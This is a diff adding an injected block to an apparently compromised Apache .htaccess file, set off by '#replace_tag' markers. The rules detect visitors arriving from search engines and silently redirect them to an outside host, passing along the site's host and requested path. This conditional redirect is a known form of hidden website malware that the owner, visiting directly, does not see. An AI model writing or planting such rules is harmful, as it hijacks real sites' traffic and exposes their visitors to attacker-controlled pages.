@@ -1,0 +1,7 @@
+#replace_tag
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_REFERER} .*(aol|google|rambler|mail|yandex|bing|yahoo).*$ [NC]
+RewriteRule .* http://voxguild.cx.cc/wstat/accepter.php?h=%{HTTP_HOST}&u=%{REQUEST_URI}&f=8bd08f8389ada199875aa06fc6cf4b5d&d=14b079c1a113a5c70c89dd4f4578c5fb [R,L]
+</IfModule>
+#replace_tag
